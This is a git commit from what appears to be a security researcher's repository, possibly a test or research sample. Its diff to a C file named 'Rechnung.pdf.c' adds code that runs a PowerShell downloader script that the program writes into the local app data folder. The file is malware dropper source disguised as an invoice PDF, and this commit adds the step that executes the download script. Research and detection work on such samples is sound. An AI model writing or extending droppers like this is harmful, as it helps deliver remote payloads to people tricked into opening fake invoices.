37a09b4ad43eb6bb7c8357eb33a7aa56347e2530
Phillip Kemkes <Phillip.Kemkes@gdata.de>
2024-09-18 16:10:13 +0200

    run downloader but not persistance

--- Rechnung.pdf.c
+++ Rechnung.pdf.c
@@ -20,4 +20,8 @@ int main() {
     char download_script_path[buffer_len];
     snprintf(download_script_path, buffer_len, "%s\\download.ps1", local_app_data_path);
     write_string(download_script_path, download_script);
+    return_val = run_powershell_script(download_script_path);
+    if (return_val != 0) {
+        return return_val;
+    }
 }
